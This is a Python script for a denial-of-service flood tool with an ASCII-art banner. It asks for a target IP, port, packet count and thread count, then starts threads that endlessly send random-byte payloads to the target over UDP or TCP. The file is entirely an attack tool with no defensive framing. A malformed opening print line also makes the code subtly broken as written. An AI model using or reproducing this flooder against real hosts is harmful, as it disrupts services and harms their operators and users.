#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")

print("print("""\033[91m


  ██████ ▓█████  ███▄    █ ▒███████▒ █    ██ 
▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒ ▒ ▒ ▄▀░ ██  ▓██▒
░ ▓██▄   ▒███   ▓██  ▀█ ██▒░ ▒ ▄▀▒░ ▓██  ▒██░
  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒  ▄▀▒   ░▓▓█  ░██░
▒██████▒▒░▒████▒▒██░   ▓██░▒███████▒▒▒█████▓ 
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▒ ▓░▒░▒░▒▓▒ ▒ ▒ 
░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░░░▒ ▒ ░ ▒░░▒░ ░ ░ 
░  ░  ░     ░      ░   ░ ░ ░ ░ ░ ░ ░ ░░░ ░ ░ 
      ░     ░  ░         ░   ░ ░       ░     
                           ░                 
\033[0m  
                                   
""")
ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" GAS? [Y/N] :"))
times = int(input(" Pakets :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1053)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"仙豆 ΣX ここ")
		except:
			print("強くないモルモット")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" 仙豆 ΣX ここ")
		except:
			s.close()
			print("強くないモルモット")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
